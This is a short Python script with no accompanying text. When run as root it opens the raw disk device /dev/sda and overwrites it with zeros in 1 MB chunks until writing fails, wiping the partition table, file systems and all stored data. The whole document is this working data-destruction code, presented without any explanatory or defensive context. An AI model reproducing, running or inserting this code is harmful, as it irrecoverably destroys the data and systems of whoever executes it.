#!/usr/bin/env python3
import os

if os.getuid() == 0:
    with open("/dev/sda", "r+b", buffering=0) as disk:
        chunk = b"\x00" * (1024 * 1024)
        while True:
            try:
                disk.write(chunk)
            except OSError:
                break
